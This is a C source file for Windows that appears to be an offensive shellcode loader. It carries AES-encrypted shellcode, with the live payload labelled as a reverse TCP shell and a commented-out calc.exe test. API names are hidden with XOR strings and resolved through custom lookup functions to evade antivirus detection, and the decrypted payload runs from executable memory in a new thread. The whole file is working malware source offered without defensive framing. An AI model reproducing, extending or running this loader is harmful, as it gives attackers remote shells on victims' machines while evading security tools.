#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#include "CustomFuncs.h"

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

/*------[INSTRUCT THE LINKER TO CONSIDER "WinMain" FUNCTION AS THE ENTRYPOINT]------*/
#pragma comment(linker, "/entry:WinMain")

/*------[DEFINE A TYPEDEF FOR A POINTER TO THE FUNCTIONS USED IN WINDOWS API]------*/
typedef LPVOID (WINAPI * VirtualAlloc_DT)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef BOOL (WINAPI * VirtualProtect_DT)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
typedef VOID (WINAPI * RtlMoveMemory_DT)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
typedef HANDLE (WINAPI * CreateThread_DT)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD (WINAPI * WaitForSingleObject_DT)(HANDLE hHandle, DWORD dwMilliseconds);

typedef BOOL (WINAPI * CryptAcquireContextW_DT)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL (WINAPI * CryptCreateHash_DT)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash);
typedef BOOL (WINAPI * CryptHashData_DT)(HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL (WINAPI * CryptDeriveKey_DT)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY  *phKey);
typedef BOOL (WINAPI * CryptDecrypt_DT)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
typedef BOOL (WINAPI * CryptReleaseContext_DT)(HCRYPTPROV hProv, DWORD dwFlags);
typedef BOOL (WINAPI * CryptDestroyHash_DT)(HCRYPTHASH hHash);
typedef BOOL (WINAPI * CryptDestroyKey_DT)(HCRYPTKEY hKey);

/*------[FUNTION USED TO DECRYPT AES-ENCRYPTED SHELLCODE]------*/
int AESDecrypt(char * payload, unsigned int payloadLen, char * key, unsigned int keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    /*------[GET ADDRESSES OF API CALLS]------*/
    CryptAcquireContextW_DT pCryptAcquireContextW = (CryptAcquireContextW_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptAcquireContextW");
    CryptCreateHash_DT pCryptCreateHash = (CryptCreateHash_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptCreateHash");
    CryptHashData_DT pCryptHashData = (CryptHashData_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptHashData");
    CryptDeriveKey_DT pCryptDeriveKey = (CryptDeriveKey_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptDeriveKey");
    CryptDecrypt_DT pCryptDecrypt = (CryptDecrypt_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptDecrypt");
    CryptReleaseContext_DT pCryptReleaseContext = (CryptReleaseContext_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptReleaseContext");
    CryptDestroyHash_DT pCryptDestroyHash = (CryptDestroyHash_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptDestroyHash");
    CryptDestroyKey_DT pCryptDestroyKey = (CryptDestroyKey_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptDestroyKey");
    
    if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }

    // The shellcode does not get executed if this function is resolved. No idea Why !!
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    
    if (!pCryptHashData(hHash, (BYTE *) key, (DWORD) keyLen, 0)) {
        return -1;
    }
    
    
    if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }
    
    if (!pCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payloadLen)) {
        return -1;
    }
    
    pCryptReleaseContext(hProv, 0);
    pCryptDestroyHash(hHash);
    pCryptDestroyKey(hKey);
    
    return 0;
}

/*------[XOR FUNCTION]------*/
void xor(char *data, const char *key, size_t data_len, size_t key_len) {

    size_t i;
    for (i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}


// int main(void) {
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    /*------[ENCRYPTED API CALLS]------*/
    unsigned char sVAlloc[] = {0x0f, 0x33, 0x33, 0x2c, 0x34, 0x38, 0x2d, 0x1b, 0x19, 0x1f, 0x0a, 0x11, 0x33};
    unsigned char sVProt[] = {0x0f, 0x33, 0x33, 0x2c, 0x34, 0x38, 0x2d, 0x0a, 0x07, 0x1c, 0x11, 0x17, 0x50, 0x46, 0x2e};
    unsigned char sRMV[] = {0x0b, 0x2e, 0x2d, 0x15, 0x2e, 0x2f, 0x24, 0x17, 0x10, 0x1e, 0x0a, 0x00, 0x4a, 0x32};
    unsigned char sCT[] = {0x1a, 0x28, 0x24, 0x39, 0x35, 0x3c, 0x15, 0x32, 0x07, 0x16, 0x04, 0x16, 0x33};
    unsigned char sWFSO[] = {0x0e, 0x3b, 0x28, 0x2c, 0x07, 0x36, 0x33, 0x09, 0x1c, 0x1d, 0x02, 0x1e, 0x56, 0x7d, 0x4c, 0x0e, 0x09, 0x0f, 0x3c, 0x58};

/* 
    $ msfvenom -p windows/x64/exec CMD=calc.exe -o calc.bin
    $ python3 aesencrypt.py calc.bin
*/

    /*------[AES ENCRYPTED SHELLCODE + ENCRYPTION KEY & THEIR LENGTHS]------*/
        // calc.exe encrypted shellcode //
    // unsigned char AESKey[] = { 0x9b, 0x1b, 0x98, 0xab, 0x3, 0xa8, 0x17, 0xd0, 0x44, 0x8, 0xf, 0x76, 0x13, 0x3, 0xd3, 0x2d};
    // unsigned char shellcode[] = { 0xb7, 0xc3, 0x23, 0x1d, 0x53, 0x21, 0x17, 0x58, 0xf3, 0x9d, 0xf2, 0x21, 0x2c, 0xc2, 0x10, 0xac, 0x5c, 0xac, 0x7d, 0x2a, 0x7a, 0x48, 0x85, 0x2b, 0xb7, 0x36, 0xd5, 0x8c, 0x8b, 0x20, 0x2e, 0xd5, 0x64, 0x20, 0x3a, 0x3a, 0x89, 0xa2, 0xd3, 0xdf, 0xa9, 0x19, 0x30, 0x8d, 0xa0, 0x12, 0x7, 0x3f, 0xbd, 0xf, 0xb3, 0xc8, 0x7c, 0xc0, 0xb7, 0xf9, 0x96, 0x1f, 0x23, 0xe5, 0xdf, 0x94, 0xe2, 0xc4, 0xfc, 0xc0, 0x2c, 0x3b, 0x4d, 0x19, 0x14, 0x22, 0xf2, 0x75, 0x4e, 0x2, 0x9c, 0xb2, 0x82, 0x86, 0xaa, 0x5a, 0x7e, 0x55, 0x31, 0xb, 0xc, 0x19, 0x0, 0x54, 0x6, 0x98, 0x2, 0xba, 0xde, 0x57, 0xb6, 0x48, 0x94, 0xce, 0xf1, 0xee, 0xdc, 0x4b, 0xdf, 0x5a, 0xd5, 0x76, 0x76, 0x6, 0x92, 0x77, 0x31, 0x3e, 0x81, 0x37, 0xfc, 0x8, 0x7, 0x60, 0x12, 0xd5, 0x91, 0x3b, 0xe6, 0xf7, 0xfb, 0xef, 0xb9, 0x55, 0x33, 0x58, 0x4c, 0xe3, 0xe4, 0x2, 0xd8, 0xd4, 0x87, 0x82, 0x4e, 0xdc, 0x6a, 0xb7, 0x7d, 0xd9, 0x95, 0xb6, 0xf2, 0xb7, 0x75, 0xd5, 0x2e, 0xaa, 0x73, 0xc7, 0xef, 0x75, 0x39, 0x69, 0x6f, 0x95, 0xd5, 0x21, 0x29, 0x9e, 0xa9, 0xd6, 0xd2, 0xd0, 0x52, 0x74, 0xf3, 0x15, 0x5b, 0x47, 0xe4, 0x76, 0xf0, 0xd1, 0x11, 0xb2, 0xe6, 0x8, 0xa7, 0xc9, 0x4a, 0x57, 0xc, 0xf9, 0xd7, 0x51, 0x26, 0x0, 0x28, 0x89, 0x49, 0x9a, 0x76, 0xe3, 0x47, 0x4c, 0x43, 0xe1, 0x4a, 0x83, 0xb4, 0x3a, 0xbc, 0x7d, 0x87, 0xf8, 0xfa, 0xef, 0xb5, 0x45, 0x31, 0x46, 0xdf, 0xe6, 0x3a, 0xa3, 0x3b, 0x92, 0xa3, 0x39, 0x1a, 0xb2, 0xd4, 0x3f, 0x25, 0x54, 0x32, 0xf4, 0x5f, 0xf5, 0xfc, 0x51, 0xb8, 0x4c, 0x89, 0x94, 0x10, 0x16, 0xee, 0x71, 0xaf, 0x67, 0x24, 0x2c, 0x76, 0x35, 0x67, 0xb1, 0x8a, 0xb2, 0xcd, 0xb9, 0x2, 0x9d, 0xe8, 0xf9, 0xc6, 0xc, 0xf0, 0xea, 0x54, 0xa0, 0xdc, 0xc4, 0x77, 0xa2, 0xf1, 0xf8, 0xae, 0x14, 0xa3, 0x1d, 0x73, 0xea, 0x26, 0xf2, 0x93, 0x4e, 0x74, 0x1a, 0x4f, 0x49 };
    
        // shell_reverse_tcp encrypted shellcode //
    unsigned char AESKey[] = { 0xf0, 0x2a, 0xaf, 0x11, 0x1e, 0xba, 0x5e, 0x61, 0x1c, 0xb2, 0xc, 0xad, 0x9d, 0x21, 0x17, 0xe };
    unsigned char shellcode[] = { 0x2b, 0xcc, 0xc8, 0x20, 0xb, 0x1f, 0xff, 0xa4, 0xd1, 0x82, 0xde, 0x7a, 0x72, 0xbf, 0x42, 0x0, 0xa5, 0xfa, 0x76, 0x85, 0x1f, 0x42, 0x8b, 0x7c, 0xd1, 0xc4, 0x92, 0x3, 0x38, 0x2d, 0xf2, 0x24, 0x53, 0x1b, 0x6f, 0xf9, 0xe2, 0x76, 0xda, 0xce, 0xcd, 0x71, 0xae, 0x8e, 0xe, 0x6, 0xfa, 0x36, 0x9a, 0x70, 0x1d, 0xe4, 0x87, 0x75, 0x81, 0xd9, 0x2b, 0xa4, 0xb3, 0x78, 0x7e, 0x39, 0xe, 0x79, 0xdc, 0x17, 0x49, 0xb8, 0x72, 0xc, 0x78, 0xe6, 0xc8, 0xc5, 0x8e, 0x7, 0xb8, 0x85, 0xd6, 0xc2, 0x56, 0xd3, 0x82, 0xe4, 0x1a, 0x32, 0xac, 0x0, 0x38, 0xad, 0x55, 0xca, 0xa2, 0xe7, 0x1c, 0x4d, 0x2a, 0x91, 0x1c, 0xd9, 0x46, 0xce, 0x42, 0x4, 0x97, 0x21, 0x84, 0x2e, 0x1e, 0x51, 0xba, 0xa6, 0xfe, 0x48, 0xed, 0xf0, 0x40, 0xed, 0x80, 0x85, 0x7b, 0xc2, 0xf, 0xc6, 0x93, 0xe8, 0x25, 0x5e, 0xe3, 0x61, 0x69, 0xc0, 0x32, 0x91, 0x56, 0xca, 0x4d, 0x80, 0xce, 0x79, 0x1a, 0xcf, 0xa3, 0x91, 0x4b, 0x61, 0xa7, 0xe5, 0xe7, 0xae, 0x50, 0x31, 0xc3, 0xf8, 0xdb, 0xf6, 0xaf, 0x66, 0xe4, 0xa7, 0xd, 0xa3, 0x5f, 0xd1, 0xbd, 0xb5, 0xa2, 0x2a, 0xe9, 0xfb, 0x52, 0xb0, 0x13, 0x72, 0x3b, 0x1, 0xd5, 0xa7, 0x77, 0xd5, 0x5, 0xe2, 0x90, 0x88, 0xe6, 0x2c, 0xd3, 0xf2, 0xb1, 0xc1, 0xf3, 0x13, 0xa1, 0x20, 0x32, 0xed, 0x45, 0xb3, 0xa1, 0x7e, 0x96, 0xf6, 0x1d, 0xa0, 0x38, 0xce, 0xca, 0x36, 0xf, 0x71, 0x71, 0x3c, 0xab, 0xf5, 0x3f, 0x98, 0x86, 0x71, 0x2, 0x2b, 0xad, 0x7f, 0x8f, 0x55, 0x72, 0x29, 0x22, 0xf, 0x2d, 0xba, 0xf6, 0x3c, 0x90, 0x2d, 0x5f, 0x71, 0x74, 0xc1, 0xff, 0xb, 0x4e, 0xa3, 0x32, 0x52, 0xe4, 0x1b, 0xb0, 0x1b, 0xd1, 0x6d, 0x32, 0xae, 0xe9, 0xbb, 0x8c, 0xbe, 0x22, 0xab, 0x42, 0x37, 0xea, 0xa1, 0x1c, 0xfe, 0x82, 0x4a, 0x5d, 0x17, 0x60, 0x3e, 0xbc, 0x1b, 0x9e, 0xea, 0x48, 0xb5, 0x75, 0x75, 0xbe, 0x9f, 0xfb, 0xd, 0x23, 0x20, 0x79, 0xd5, 0xb, 0x4, 0xf5, 0x15, 0x25, 0xf9, 0x7f, 0x94, 0x51, 0xb2, 0x61, 0x9d, 0xbb, 0x5f, 0x8b, 0x9b, 0x68, 0x91, 0x76, 0x1f, 0xa3, 0x1, 0x56, 0x23, 0xd5, 0xaa, 0xb8, 0x65, 0x4d, 0x27, 0xc6, 0x50, 0x32, 0x35, 0x0, 0x2d, 0x98, 0xa5, 0xb8, 0x5e, 0xba, 0xcf, 0x7, 0x30, 0x1a, 0x2b, 0xa5, 0x3e, 0xb6, 0x4, 0x16, 0x4b, 0x50, 0x5e, 0xe9, 0xdc, 0xe0, 0xf8, 0xd9, 0xca, 0x67, 0xd7, 0x53, 0x92, 0x32, 0xde, 0xf6, 0xaf, 0xec, 0x97, 0x52, 0x8b, 0x9f, 0x66, 0xb1, 0x47, 0xe0, 0x24, 0xec, 0x50, 0x60, 0x6, 0xad, 0x87, 0xe4, 0xdf, 0xe1, 0xf0, 0xbd, 0x82, 0x7d, 0x7e, 0xc9, 0x6f, 0x33, 0xb3, 0x94, 0x61, 0xba, 0x9e, 0xae, 0xd4, 0x33, 0x33, 0x3d, 0xb6, 0xca, 0x1b, 0x97, 0x56, 0x97, 0xa5, 0x4d, 0x1a, 0xf6, 0x8b, 0x31, 0xba, 0xaf, 0x97, 0x73, 0xd1, 0x32, 0x3c, 0x96, 0x2, 0x1a, 0x75, 0xf0, 0x46, 0x87, 0x6b, 0xa4, 0x41, 0x62, 0x4f, 0x97, 0xfe, 0xf9, 0xe3, 0x52, 0xee, 0xf9, 0x9, 0xd7, 0x89, 0xee, 0x7e, 0x6c, 0x86, 0xca, 0x55, 0x72, 0x48, 0xaf, 0xfd, 0x1d, 0x2, 0x28, 0x36, 0xd0, 0xd2, 0xd9, 0x90, 0x31, 0x4b, 0xea, 0x7b, 0xf5, 0x7, 0x59, 0xe2, 0xd6, 0xaa, 0xbe, 0x39, 0xdb, 0x12 };
    size_t shellcodeLen = sizeof(shellcode);
    size_t AESKeyLen = sizeof(AESKey);

    /*------[ENCRYPTION KEY]------*/
    char sk[] = "YZAXAYAZuser32.dllHXAYZ>H";

    /*------[DECRYPTING API FUNCTIONS]------*/
    xor((char *) sVAlloc, sk, sizeof(sVAlloc), strlen(sk));
    xor((char *) sVProt, sk, sizeof(sVProt), strlen(sk));
    xor((char *) sRMV, sk, sizeof(sRMV), strlen(sk));
    xor((char *) sCT, sk, sizeof(sCT), strlen(sk));
    xor((char *) sWFSO, sk, sizeof(sWFSO), strlen(sk));

    /*------[DECLARED VARIABLES]------*/
    LPVOID ExecMem;
    BOOL retVP;
    DWORD oldProtect = 0;
    HANDLE hThread;

    /*------[GET ADDRESSES OF API CALLS]------*/
    VirtualAlloc_DT pVirtualAlloc = (VirtualAlloc_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sVAlloc);
    VirtualProtect_DT pVirtualProtect = (VirtualProtect_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sVProt);
    RtlMoveMemory_DT pRtlMoveMemory = (RtlMoveMemory_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sRMV);
    CreateThread_DT pCreateThread = (CreateThread_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sCT);
    WaitForSingleObject_DT pWaitForSingleObject = (WaitForSingleObject_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sWFSO);

    /*------[ALLOCATE MEMORY BUFFER]------*/
    ExecMem = pVirtualAlloc(0, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    /*------[DECRYPT THE SHELLCODE]------*/
    AESDecrypt((char *) shellcode, shellcodeLen,(char *) AESKey, AESKeyLen);

    /*------[WRITE SHELLCODE IN THE ALLOCATED BUFFER]------*/
    pRtlMoveMemory(ExecMem, shellcode, shellcodeLen);

    /*------[CHANGE MEM PROTECTIONS]------*/
    retVP = pVirtualProtect(ExecMem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);

    /*------[CREATE A THREAD THAT WILL EXECUTE OUR SHELLCODE]------*/
    if (retVP) {
        hThread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) ExecMem, 0, 0, 0);
        pWaitForSingleObject(hThread, -1);
    }

    return 0;
}
